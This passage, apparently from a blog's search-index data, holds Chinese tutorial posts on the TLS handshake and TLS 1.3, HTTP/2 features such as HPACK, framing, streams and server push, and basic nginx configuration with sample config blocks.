版本和使用的密码套件，而且你可能发现客户端和服务端都会各自生成一个随机数，并且还会把随机数传递给对方。那这个随机数有啥用呢？其实这两个随机数是后续作为生成「会话密钥」的条件，所谓的会话密钥就是数据传输时，所使用的对称加密密钥。\n\n\n\n然后，服务端为了证明自己的身份，会发送「**Server Certificate**」给客户端，这个消息里含有数字证书。\n\n![1](https协议原理和认证过程/3.jpg)\n\n\n\n随后，服务端发了「**Server Hello Done**」消息，目的是告诉客户端，我已经把该给你的东西都给你了，本次打招呼完毕。\n\n![1](https协议原理和认证过程/4.jpg)\n\n\n\n<img src=\"https协议原理和认证过程/v2-d3ab3e41c76aa233f5cd4898bc9e819e_b.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.3 客户端验证 服务器证书 和 协商密钥\n\n客户端去验证完证书后，认为可信则继续往下走。接着，客户端就会生成一个新的随机数 (pre-master)，用服务器的 RSA 公钥加密该随机数，通过「Change Cipher Key Exchange」消息传给服务端。\n\n![1](https协议原理和认证过程/5.jpg)\n\n\n\n服务端收到后，用 RSA 私钥解密，得到客户端发来的随机数 (pre-master)。\n\n至此，**客户端和服务端双方都共享了三个随机数，分别是 Client Random、Server Random、pre-master**。\n\n\n\n于是，双方根据已经得到的三个随机数，生成**会话密钥（Master Secret）**，它是对称密钥，用于对后续的 HTTP 请求/响应的数据加解密。\n\n生成完会话密钥后，然后客户端发一个「**Change Cipher Spec**」，告诉服务端开始使用加密方式发送消息。\n\n![1](https协议原理和认证过程/6.jpg)\n\n然后，客户端再发一个「**Encrypted Handshake Message（Finishd）**」消息，把之前所有发送的数据做个摘要，再用会话密钥（master secret）加密一下，让服务器做个验证，验证加密通信是否可用和之前握手信息是否有被中途篡改过。\n\n\n\n![1](https协议原理和认证过程/7.jpg)\n\n可以发现，「Change Cipher Spec」之前传输的 TLS 握手数据都是明文，之后都是对称密钥加密的密文。\n\n\n\n### 3.4 服务端向客户端发送 Finished 消息\n\n服务器也是同样的操作，发「**Change Cipher Spec**」和「**Encrypted Handshake Message**」消息，如果双方都验证加密和解密没问题，那么握手正式完成。\n\n最后，就用「会话密钥」加解密 HTTP 请求和响应了。\n\n\n\n# 4. TLS 升级\n\n如果可以把 TLS 1.2 升级成 TLS 1.3，TLS 1.3 大幅度简化了握手的步骤，完成 TLS 握手只要 1 RTT，而且安全性更高。\n\n在 TLS 1.2 的握手中，一般是需要 4 次握手，先要通过 Client Hello （第 1 次握手）和 Server Hello（第 2 次握手） 消息协商出后续使用的加密算法，再互相交换公钥（第 3 和 第 4 次握手），然后计算出最终的会话密钥，下图的左边部分就是 TLS 1.2 的握手过程：\n\n![1](https协议原理和认证过程/13.jpg)\n\n上图的右边部分就是 TLS 1.3 的握手过程，可以发现 TLS 1.3 把 Hello 和公钥交换这两个消息合并成了一个消息，于是这样就减少到只需 1 RTT 就能完成 TLS 握手。\n\n怎么合并的呢？具体的做法是，客户端在 Client Hello 消息里带上了支持的椭圆曲线，以及这些椭圆曲线对应的公钥。\n\n服务端收到后，选定一个椭圆曲线等参数，然后返回消息时，带上服务端这边的公钥。经过这 1 个 RTT，双方手上已经有生成会话密钥的材料了，于是客户端计算出会话密钥，就可以进行应用数据的加密传输了。\n\n而且，TLS1.3 对密码套件进行“减肥”了， 对于密钥交换算法，废除了不支持前向安全性的 RSA 和 DH 算法，只支持 ECDHE 算法。\n\n\n\n# 5. 参考资料\n\n+ https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\n+ https://draveness.me/whys-the-design-https-latency/\n+ https://zhuanlan.zhihu.com/p/344086342\n+ https://zhuanlan.zhihu.com/p/348215533\n+ https://zhuanlan.zhihu.com/p/346489295","tags":["http"],"categories":["https"]},{"title":"http2的变化和","url":"%2Fp%2Fd55bd12d.html","content":"\n# 1. http2介绍\n\nHTTP/2 出来的目的是为了改善 HTTP 的性能。协议升级有一个很重要的地方，就是要兼容老版本的协议，否则新协议推广起来就相当困难，所幸 HTTP/2 做到了兼容 HTTP/1.1 。那么，HTTP/2 是怎么做的呢？\n\n第一点，HTTP/2 没有在 URI 里引入新的协议名，仍然用「http://」表示明文协议，用「https://」表示加密协议，于是只需要浏览器和服务器在背后自动升级协议，这样可以让用户意识不到协议的升级，很好的实现了协议的平滑升级。\n\n第二点，只在应用层做了改变，还是基于 TCP 协议传输，应用层方面为了保持功能上的兼容，HTTP/2 把 HTTP 分解成了「语义」和「语法」两个部分，「语义」层不做改动，与 HTTP/1.1 完全一致，比如请求方法、状态码、头字段等规则保留不变。\n\n但是，HTTP/2 在「语法」层面做了很多改造，基本改变了 HTTP 报文的传输格式。\n\n<!-- more -->\n\n# 2. http2功能\n\n### 2.1 Header压缩\n\nHTTP 协议的报文是由「Header + Body」构成的，对于 Body 部分，HTTP/1.1 协议可以使用头字段 「Content-Encoding」指定 Body 的压缩方式，比如用 gzip 压缩，这样可以节约带宽，但报文中的另外一部分 Header，是没有针对它的优化手段。\n\nHTTP/1.1 报文中 Header 部分存在的问题：\n\n- 含很多固定的字段，比如Cookie、User Agent、Accept 等，这些字段加起来也高达几百字节甚至上千字节，所以有必要压缩；\n- 大量的请求和响应的报文里有很多字段值都是重复的，这样会使得大量带宽被这些冗余的数据占用了，所以有必须要避免重复性；\n- 字段是 ASCII 编码的，虽然易于人类观察，但效率低，所以有必要改成二进制编码；\n\nHTTP/2 对 Header 部分做了大改造，把以上的问题都解决了。\n\n\n\nHTTP/2 没使用常见的 gzip 压缩方式来压缩头部，而是开发了 HPACK 算法，HPACK 算法主要包含三个组成部分：\n\n- 静态字典；\n- 动态字典；\n- Huffman 编码（压缩算法）；\n\n客户端和服务器两端都会建立和维护「字典」，用长度较小的索引号表示重复的字符串，再用 Huffman 编码压缩数据，可达到 50%~90% 的高压缩率。\n\n\n\n静态表包含了 61 种高频出现在头部的字符串，不在静态表范围内的头部字符串就要自行构建动态表，它的 Index 从 `62` 起步，会在编码解码的时候随时更新。\n\n比如，第一次发送时头部中的「`user-agent` 」字段数据有上百个字节，经过 Huffman 编码发送出去后，客户端和服务器双方都会更新自己的动态表，添加一个新的 Index 号 62。**那么在下一次发送的时候，就不用重复发这个字段的数据了，只用发 1 个字节的 Index 号就好了，因为双方都可以根据自己的动态表获取到字段的数据**。\n\n所以，使得动态表生效有一个前提：**必须同一个连接上，重复传输完全相同的 HTTP 头部**。如果消息字段在 1 个连接上只发送了 1 次，或者重复传输时，字段总是略有变化，动态表就无法被充分利用了。\n\n\n\n理想很美好，现实很骨感。动态表越大，占用的内存也就越大，如果占用了太多内存，是会影响服务器性能的，因此 Web 服务器都会提供类似 `http2_max_requests` 的配置，用于限制一个连接上能够传输的请求数量，避免动态表无限增大，请求数量到达上限后，就会关闭 HTTP/2 连接来释放内存。\n\n\n\nHTTP/2 头部的编码通过「静态表、动态表、Huffman 编码」共同完成的。\n\n### 2.2 二进制传输数据\n\nHTTP/2 厉害的地方在于将 HTTP/1 的文本格式改成二进制格式传输数据，极大提高了 HTTP 传输效率，而且二进制数据使用位运算能高效解析。\n\nHTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为\"帧\"（frame）：头信息帧和数据帧。\n\n你可以从下图看到，HTTP/1.1 的响应 和 HTTP/2 的区别：\n\n<img src=\"http2的变化和区别/1.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\n\nHTTP/2 把响应报文划分成了两个帧（Frame），图中的 HEADERS（首部）和 DATA（消息负载） 是帧的类型，也就是说一条 HTTP 响应，划分成了两个帧来传输，并且采用二进制来编码。\n\nHTTP/2 二进制帧的结构如下图：\n\n<img src=\"http2的变化和区别/v2-bdb8061166cf5137f3f8559f53ebdfbd_1440w.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n帧头（Fream Header）很小，只有 9 个字节，帧开头的前 3 个字节表示帧数据（Fream Playload）的**长度**。\n\n帧长度后面的一个字节是表示帧的类型，HTTP/2 总共定义了 10 种类型的帧，一般分为数据帧和控制帧两类，如下表格：\n\n<img src=\"http2的变化和区别/v2-e2938c27e41042382cd86684e392d30f_1440w.jpg\" alt=\"img\" style=\"zoom:67%;\" />\n\n帧类型后面的一个字节是标志位，可以保存 8 个标志位，用于携带简单的控制信息，比如：\n\n- END_HEADERS 表示头数据结束标志，相当于 HTTP/1 里头后的空行（“\\r\\n”）；\n- END_STREAM 表示单方向数据发送结束，后续不会再有数据帧。\n- PRIORITY 表示流的优先级；\n\n帧头的最后 4 个字节是流标识符（Stream ID），但最高位被保留不用，只有 31 位可以使用，因此流标识符的最大值是 2^31，大约是 21 亿，它的作用是用来标识该 Fream 属于哪个 Stream，接收方可以根据这个信息从乱序的帧里找到相同 Stream ID 的帧，从而有序组装信息。\n\n最后面就是帧数据了，它存放的是通过 HPACK 算法压缩过的 HTTP 头部和包体。\n\n\n\n### 2.3 Stream并发传输\n\n我们都知道 HTTP/1.1 的实现是基于请求-响应模型的。同一个连接中，HTTP 完成一个事务（请求与响应），才能处理下一个事务，也就是说在发出请求等待响应的过程中，是没办法做其他事情的，如果响应迟迟不来，那么后续的请求是无法发送的，也造成了队头阻塞的问题。\n\n而 HTTP/2 通过 Stream 这个设计，多个 Stream 复用一条 TCP 连接，达到并发的效果，解决了 HTTP/1.1 队头阻塞的问题，提高了 HTTP 传输的吞吐量。\n\n![img](http2的变化和区别/v2-5ee4f92e3579000821f2ffe0babb3cc8_1440w.jpg)\n\n\n\n可以从上图中看到：\n\n- 1 个 TCP 连接包含一个或者多个 Stream，Stream 是 HTTP/2 并发的关键技术；\n- Stream 里可以包含 1 个或多个 Message，Message 对应 HTTP/1 中的请求或响应，由 HTTP 头部和包体构成；\n- Message 里包含一条或者多个 Frame，Frame 是 HTTP/2 最小单位，以二进制压缩格式存放 HTTP/1 中的内容（头部和包体）；\n\n\n\n在 HTTP/2 连接上，不同 Stream 的帧是可以乱序发送的（因此可以并发不同的 Stream ），因为每个帧的头部会携带 Stream ID 信息，所以接收端可以通过 Stream ID 有序组装成 HTTP 消息，而同一 Stream 内部的帧必须是严格有序的。\n\n<img src=\"http2的变化和区别/v2-57da2b01b848cda5d7dbf8decaf6268b_1440w.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n客户端和服务器双方都可以建立 Stream， Stream ID 也是有区别的，客户端建立的 Stream 必须是奇数号，而服务器建立的 Stream 必须是偶数号。\n\n同一个连接中的 Stream ID 是不能复用的，只能顺序递增，所以当 Stream ID 耗尽时，需要发一个控制帧 `GOAWAY`，用来关闭 TCP 连接。\n\n在 Nginx 中，可以通过 `http2_max_concurrent_streams` 配置来设置 Stream 的上限，默认是 128 个。\n\n\n\nHTTP/2 通过 Stream 实现的并发，比 HTTP/1.1 通过 TCP 连接实现并发要牛逼的多，因为当 HTTP/2 实现 100 个并发 Stream 时，只需要建立一次 TCP 连接，而 HTTP/1.1 需要建立 100 个 TCP 连接，每个 TCP 连接都要经过TCP 握手、慢启动以及 TLS 握手过程，这些都是很耗时的。\n\nHTTP/2 还可以对每个 Stream 设置不同优先级，帧头中的「标志位」可以设置优先级，比如客户端访问 HTML/CSS 和图片资源时，希望服务器先传递 HTML/CSS，再传图片，那么就可以通过设置 Stream 的优先级来实现，以此提高用户体验。\n\n\n\n### 2.4 服务器主动推送\n\n比如，客户端通过 HTTP/1.1 请求从服务器那获取到了 HTML 文件，而 HTML 可能还需要依赖 CSS 来渲染页面，这时客户端还要再发起获取 CSS 文件的请求，需要两次消息往返，如下图左边部分：\n\n![img](http2的变化和区别/1.png)\n\n如上图右边部分，在 HTTP/2 中，客户端在访问 HTML 时，服务器可以直接主动推送 CSS 文件，减少了消息传递的次数。\n\n\n\n在 Nginx 中，如果你希望客户端访问 /test.html 时，服务器直接推送 /test.css，那么可以这么配置：\n\n```nginx\nlocation /test.html { \n  http2_push /test.css; \n}\n```\n\n**另外Server Push不同于Websocket，Server Push一般是指服务器主动向客户端推送数据，这是一种单向的主动推送，而WebSocket是双向的，这两种技术不是竞争关系。**\n\nServer Push可以用在服务器主动向客户端推送静态资源，比如浏览器请求index.html时，服务器除了返回网页内容外，还会将index.html页面里面的各种css和js一起推送到浏览器缓存起来，当浏览器分析了网页内容发现静态资源时，不需要再去服务器请求一次，它只需要从缓存里直接拿就可以了。不过现代的网站的静态资源大多都是CDN架构的，静态资源都在第三方服务器，Server Push在这方面作用并不大。\n\n\n\n# 3. 长连接区别\n\n### 3.1 websocket\n\nWebSocket是全双工的，可以双向通信，主要应用在实时通信的场景中，服务器可以实时推送数据给客户端。\n\n### 3.2 SSE 技术\n\nSSE （ Server-sent Events ）是 WebSocket 的一种轻量代替方案，使用 HTTP 协议。严格地说，HTTP 协议是没有办法做服务器推送的，但是当服务器向客户端声明接下来要发送流信息时，客户端就会保持连接打开，SSE 使用的就是这种原理。\n\nSSE 是单向通道，只能服务器向客户端发送消息，如果客户端需要向服务器发送消息，则需要一个新的 HTTP 请求。 这对比 WebSocket 的双工通道来说，会有更大的开销。\n\n### 3.3 http2 \n\nHTTP/2 虽然也支持 Server Push，但是服务器只能主动将资源推送到客户端缓存！那不是应用程序可以感知的，主要是让浏览器（用户代理）提前缓存静态资源。\n\nHTTP/2不是类似于Websocket或者SSE这样的推送技术的替代品。\n\n\n\n# 4. 复用 tcp 连接\n\n### 4.1 http1 baseline\n\n所谓长连接，即在 HTTP 请求建立 TCP 连接时，请求结束，TCP 连接不断开，继续保持一段时间（timeout），在这段时间内，同一客户端向服务器发送请求都会复用该 TCP 连接，并重置 timeout 时间计数器，在接下来 timeout 时间内还可以继续复用 TCP 。\n\ntimeout 时间到了之后，TCP会立即断开连接吗？\n\n若两小时（timeout）没有收到客户的数据，服务器就发送一个探测报文段，以后则每隔 75 秒发送一次。若一连发送 10 个探测报文段后仍无客户的响应，服务器就认为客户端出了故障，接着就关闭这个连接。\n\n<img src=\"http2的变化和区别/48abea2a282d4289aa51d361ae8c23fe~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:40%;\" />\n\nHTTP/1.x 虽然引入了 keep-alive 长连接，但它每次请求必须等待上一次响应之后才能发起。\n\n所以，在 HTTP/1.1 中提出了管道机制（默认不开启），下一次的请求不需要等待上一个响应来之后再发送，但这要求服务端必须按照请求发送的顺序返回响应，当顺序请求多个文件时，其中一个请求因为某种原因被阻塞时，在后面排队的所有请求也一并被阻塞，这就是 HTTP 队头阻塞 (Head-Of-Line Blocking)。\n\n### 4.2 http2 multiplex\n\n+ HTTP/1.x 是基于文本的，只能整体去传；HTTP/2 是基于二进制流的，可以分解为独立的帧，交错发送\n+ HTTP/1.x keep-alive 必须按照请求发送的顺序返回响应；HTTP/2 多路复用不按序响应。\n+ HTTP/1.x keep-alive 为了解决 http 队头阻塞，将同一个页面的资源分散到不同域名下，开启了多个 TCP 连接；HTTP/2 同域名下所有通信都在单个连接上完成。\n+ HTTP/1.x keep-alive 单个 TCP 连接在同一时刻只能处理一个请求（两个请求的生命周期不能重叠）；HTTP/2 单个 TCP 同一时刻可以发送多个请求和响应。\n\n<img src=\"http2的变化和区别/bVbck6Y.png\" alt=\"clipboard.png\" style=\"zoom:50%;\" />\n\n# 5. 队头阻塞问题\n\n很多人在一些资料中会看到有论点说HTTP/2解决了队头阻塞的问题。但是这句话只对了一半。只能说HTTP/2解决了HTTP的队头阻塞问题，但是并没有解决TCP队头阻塞问题!\n\n### 5.1 HTTP 队头阻塞\n\nhttp1.x采用长连接(Connection:keep-alive)，可以在一个TCP请求上，发送多个http请求。有非管道化和管道化，两种方式。\n\n非管道化：完全串行执行，请求->响应->请求->响应...，后一个请求必须在前一个响应之后发送。\n\n管道化：请求可以并行发出，但是响应必须串行返回。后一个响应必须在前一个响应之后。原因是，没有序号标明顺序，只能串行接收。\n\n无论是非管道化还是管道化，都会造成队头阻塞(请求阻塞)。\n\n### 5.2 TCP 队头阻塞\n\nTCP数据包是有序传输，中间一个数据包丢失，会等待该数据包重传，造成后面的数据包的阻塞。\n\n### 5.3 总结\n\nHTTP/1.1的管道化持久连接也是使得同一个TCP链接可以被多个HTTP使用，但是HTTP/1.1中规定一个域名可以有6个TCP连接。\n\nHTTP/2使用一个域名单一TCP连接发送请求，请求包被二进制分帧，不同请求可以互相穿插，避免了 http 层面的请求队头阻塞。但是不能避免TCP层面的队头阻塞。\n\n所以，在HTTP/2中，TCP队头阻塞造成的影响会更大，因为HTTP/2的多路复用技术使得多个请求其实是基于同一个TCP连接的，那如果某一个请求造成了TCP队头阻塞，那么多个请求都会受到影响。\n\n# 6. http3是什么\n\nHTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。但当这个连接中出现了丢包的情况，那就会导致 HTTP/2 的表现情况反倒不如 HTTP/1 了。\n\n因为在出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后面的所有数据都被阻塞了。但是对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。\n\nGoogle 就更起炉灶搞了一个基于 UDP 协议的 QUIC 协议，并且使用在了 HTTP/3 上，HTTP/3 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP/3 最大的改造就是使用了 QUIC。\n\n\n\n# 7. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/359920955\n","tags":["http"],"categories":["http"]},{"title":"nginx常用模块和配置实战","url":"%2Fp%2F7245bfc7.html","content":"\nNginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。\n\n\n\n# 零. 前言\n\n### 0.1 配置文件在哪\n\n安装好nginx我们首先要知道配置文件在哪里?\n\n![1](nginx常用模块和配置实战/1.png)\n\n\n\n说明nginx的主配置文件都在 `/etc/nginx/nginx.conf`里. 打开文件我们还可以看到\n\n```ngnix\ninclude /etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n```\n\n\n\n需要添加新配置选项的地方位于 sites-enabled 文件夹。如果你打开这个文件夹，你会发现一个名为 default 的文档，打开后你就会找到nginx的配置选项, 当你安装好nginx默认看到的首页就是在这里配置的.\n\n\n\n在该目录下还有一个 sites-available 的文件夹, 这个文件夹一般在你需要建立和管理多个站点的时候非常有用，可以帮助你更好的组织不同的项目。你需要在这里添加你的nginx配置文案并将他们链接至 sites-enabled 目录下。\n\n\n\n只有在 sites-enabled 目录下的配置文件才能够真正被用户访问。但是你同样可以将文件放在 sites-available 目录下用来存档或者生成链接。\n\n<!-- more -->\n\n\n\n### 0.2 默认root在哪\n\n```bash\nnginx -V\nit lists --prefix as the first one.\n```\n\n\n\n### 0.3 重启nginx\n\n```bash\nsudo nginx -s reload\n```\n\nreload，重新加载的意思，reload会重新加载配置文件，nginx服务不会中断，而且reload时会测试conf语法等，如果出错会rollback用上一次正确配置文件保持正常运行。\n\nrestart，重启，会重启nginx服务。这个重启会造成服务一瞬间的中断，当然如果配置文件出错会导致服务启动失败，那就是更长时间的服务中断了。\n\n\n\n# 一. nginx 常用功能说明\n\n\n\n### 1.1 反向代理\n\n下面一张图是对正向代理与反响代理的对比\n\n\n![1](nginx常用模块和配置实战/1.jpg)\n\nNginx在做反向代理时，提供性能稳定，并且能够提供配置灵活的转发功能。Nginx可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走web服务器，只要你正则写的没问题，又有相对应的服务器解决方案，你就可以随心所欲的玩。并且Nginx对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以将请求重新转发给另外一台服务器，然后自动去除异常服务器。\n\n\n\n### 1.2 负载均衡\n\nNginx提供的负载均衡策略有2种：内置策略和扩展策略。\n\n内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。\n\n\n\n看下面的图理解三种负载均衡算法的实现\n\n![1](nginx常用模块和配置实战/2.jpg)\n\n\n\nIp hash算法，对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。\n\n![1](nginx常用模块和配置实战/3.jpg)\n\n\n\n### 1.3 web缓存\n\nnginx可以对不同的文件做不同的缓存处理，配置灵活，并且支持FastCGI_Cache，主要用于对FastCGI的动态程序进行缓存。配合着第三方的ngx_cache_purge，对制定的URL缓存内容可以的进行增删管理。\n\n\n\n# 二. nginx配置文件结构\n\n\n\n先放一个配置demo\n\n```nginx\nuser  nobody;\nworker_processes  1;\npid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nupstream mysvr {   \n  server 127.0.0.1:7878;\n  server 192.168.10.121:3333 backup;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n  \n    server {\n        listen       80;\n        server_name  localhost;\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n    }\n}\n```\n\n\n\n### 2.1 配置文件结构\n\n+ main(全局块)[一个]\n+ events (nginx工作模式)[一个]\n\n+ http(http设置)[一个]\n  + server(主机设置)[http里多个]\n    + location(URL匹配)[server里多个]\n  + upstream(负载均衡服务器设置)[http里一个]\n\n\n\n1、全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。\n\n2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。\n\n3、http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。\n\n4、server块：配置虚拟主机的相关参数，一个http中可以有多个server。\n\n5、location块：配置请求的路由，以及各种页面的处理情况。\n\n6、upstream块：负责负载均衡\n\n\n\n```nginx\n########### 每个指令必须有分号结束。#################\n\n#user administrator administrators;  #配置用户或者组，默认为nobody nobody。\n#worker_processes 2;  #允许生成的进程数，默认为1\n#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址\n\nerror_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别分别为：debug|info|notice|warn|error|crit|alert|emerg\n\n\nevents {\n    accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on\n    multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off\n    #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #最大连接数，默认为512\n}\n\n\nhttp {\n    include       mime.types;   #文件扩展名与文件类型映射表\n    default_type  application/octet-stream; #默认文件类型，默认为text/plain\n    #access_log off; #取消服务日志    \n    log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式\n    access_log log/access.log myFormat;  #combined为日志格式的默认值\n  \n \n    sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。\n    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。\n    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #热备\n    }\n  \n    error_page 404 https://www.baidu.com; #错误页\n    \n  \tserver {\n        keepalive_requests 120; #单连接请求上限次数。\n        listen       4545;   #监听端口\n        server_name  127.0.0.1;   #监听地址       \n        \n    \t\tlocation  ~*^.+$ {       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。\n           #root path;  #根目录\n           #index vv.txt;  #设置默认页\n           proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表\n           deny 127.0.0.1;  #拒绝的ip\n           allow 172.18.5.54; #允许的ip           \n        }\n    }\n}\n```\n\n\n\n+ `$remote_addr` 与`$http_x_forwarded_for` 用以记录客户端的ip地址； \n+ `$remote_user` 用来记录客户端用户名称； \n+ `$time_local` 用来记录访问时间与时区；\n+ `$request` 用来记录请求的url与http协议；\n+ `$status` 用来记录请求状态；成功是200， \n+ `body_bytes_sent` 记录发送给客户端文件主体内容大小；\n+ `$http_referer` 用来记录从那个页面链接访问过来的； 8.$http_user_agent ：记录客户端浏览器的相关信息；\n\n+ 惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。\n\n+ 每个指令必须有分号结束。\n\n\n\n# 三. 模块配置说明\n\n### 3.1 main模块\n\n```nginx\nuser nobody nobody;\nworker_processes 2;\nerror_log  /usr/local/var/log/nginx/error.log  notice;\npid        /usr/local/var/run/nginx/nginx.pid;\nworker_rlimit_nofile 1024;\n```\n\n\n\n+ user 来指定Nginx Worker进程运行用户以及用户组，默认由nobody账号运行。\n\n+ worker_processes来指定了Nginx要开启的子进程数。每个Nginx进程平均耗费10M~12M内存。根据经验，一般指定1个进程就足够了，如果是多核CPU，建议指定和CPU的数量一样的进程数即可。我这里写2，那么就会开启2个子进程，总共3个进程。可以写 auto.\n\n+ error_log用来定义全局错误日志文件。日志输出级别有debug、info、notice、warn、error、crit可供选择，其中，debug输出日志最为最详细，而crit输出日志最少。\n\n+ pid用来指定进程id的存储文件位置。\n\n+ worker_rlimit_nofile用于指定一个nginx进程可以打开的最多文件描述符数目，这里是65535，需要使用命令“ulimit -n 65535”来设置。\n\n  \n\n### 3.2 events 模块\n\nevents模块来用指定nginx的工作模式和工作模式及连接数上限\n\n```nginx\nevents {\n     use kqueue; #mac平台\n     worker_connections  1024;\n}\n```\n\n\n\n+ use用来指定Nginx的工作模式。Nginx支持的工作模式有select、poll、kqueue、epoll、rtsig和/dev/poll。其中select和poll都是标准的工作模式，kqueue和epoll是高效的工作模式，不同的是epoll用在Linux平台上，而kqueue用在BSD系统中，因为Mac基于BSD,所以Mac也得用这个模式，对于Linux系统，epoll工作模式是首选。\n\n+ worker_connections用于定义Nginx每个进程的最大连接数，即接收前端的最大请求数，默认是1024。最大客户端连接数由worker_processes和worker_connections决定\n+ 即Max_clients=worker_processes*worker_connections，在作为反向代理时，Max_clients变为：Max_clients = worker_processes * worker_connections/4。 \n\n+ 进程的最大连接数受Linux系统进程的最大打开文件数限制，在执行操作系统命令“ulimit -n 65536”后worker_connections的设置才能生效。\n\n\n\n### 3.3 http 模块\n\nhttp模块可以说是最核心的模块了，它负责HTTP服务器相关属性的配置，它里面的server和upstream子模块，至关重要。\n\n```nginx\nhttp {\n     include       mime.types;\n     default_type  application/octet-stream;\n     log_format  main  'remote_addr - remote_user [time_local] \"request\" '\n                       'status body_bytes_sent \"$http_referer\" '\n                       '\"http_user_agent\" \"http_x_forwarded_for\"';\n     access_log  /usr/local/var/log/nginx/access.log  main;\n     sendfile        on;\n     tcp_nopush      on;\n     tcp_nodelay     on;\n     keepalive_timeout  10;\n     #gzip  on;\n     \n     upstream myproject {\n         .....\n     }\n     \n  \t server {\n         ....\n     }\n}\n```\n\n\n\n+ include 用来设定文件的mime类型,类型在配置文件目录下的mime.type文件定义，来告诉nginx来识别文件类型。\n\n+ default_type设定了默认的类型为二进制流，也就是当文件类型未定义时使用这种方式。\n\n+ log_format用于设置日志的格式，和记录哪些参数，这里设置为main，刚好用于access_log来记录这种类型。\n\n  main的类型日志如下：也可以增删部分参数。\n\n  127.0.0.1 - - [21/Apr/2015:18:09:54 +0800] \"GET /index.php HTTP/1.1\" 200 87151 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\" \n\n+ access_log 用来纪录每次的访问日志的文件地址，后面的main是日志的格式样式，对应于log_format的main。\n\n+ sendfile参数用于开启高效文件传输模式。\n+ 将tcp_nopush和tcp_nodelay两个指令设置为on用于防止网络阻塞。\n\n+ keepalive_timeout设置客户端连接保持活动的超时时间。在超过这个时间之后，服务器会关闭该连接。\n\n\n\n### 3.4 server 模块 (http的子模块, 虚拟主机)\n\nsever 模块是http的子模块，它用来定一个虚拟主机。我们看一下一个简单的server 是如何做的？\n\n```nginx\nserver {\n         listen       8080;\n         server_name  test.liuvv.com;\n         root   /home/levonfly/www;         # 全局定义，如果都是这一个目录，这样定义最简单。\n         index  index.php index.html index.htm; \n         charset utf-8;\n         access_log  usr/local/var/log/host.access.log  main;\n         aerror_log  usr/local/var/log/host.error.log  error;\n         ....\n}\n```\n\n+ server标志定义虚拟主机开始。 \n\n+ listen用于指定虚拟主机的服务端口。 \n\n+ server_name用来指定IP地址或者域名，多个域名之间用空格分开。 \n\n+ root 表示在这整个server虚拟主机内，全部的root web根目录。注意要和locate {}下面定义的区分开来。 \n\n+ index 全局定义访问的默认首页地址。注意要和locate {}下面定义的区分开来。 \n\n+ charset用于设置网页的默认编码格式。 \n\n+ access_log用来指定此虚拟主机的访问日志存放路径，最后的main用于指定访问日志的输出格式。\n\n\n\n### 3.5 location 模块(server的子模块, 重要)\n\nlocation模块是nginx中用的最多的，也是最重要的模块了，什么负载均衡啊、反向代理啊、虚拟域名啊都与它相关。\n\nlocation 根据它字面意思就知道是来定位的，定位URL，解析URL，所以，它也提供了强大的正则匹配功能，也支持条件判断匹配，用户可以通过location指令实现Nginx对动、静态网页进行过滤处理。\n\n\n\n我们先来看这个，设定默认首页和虚拟机目录。\n\n```nginx\nlocation / {\n\troot   /home/levonfly/www;\n\tindex  index.php index.html index.htm;\n}\n```\n\n+ location /表示匹配访问根目录。\n\n+ root指令用于指定访问根目录时，虚拟主机的web目录，这个目录可以是相对路径（相对路径是相对于nginx的安装目录）。也可以是绝对路径。\n\n+ index用于设定我们只输入域名后访问的默认首页地址，有个先后顺序：index.php index.html 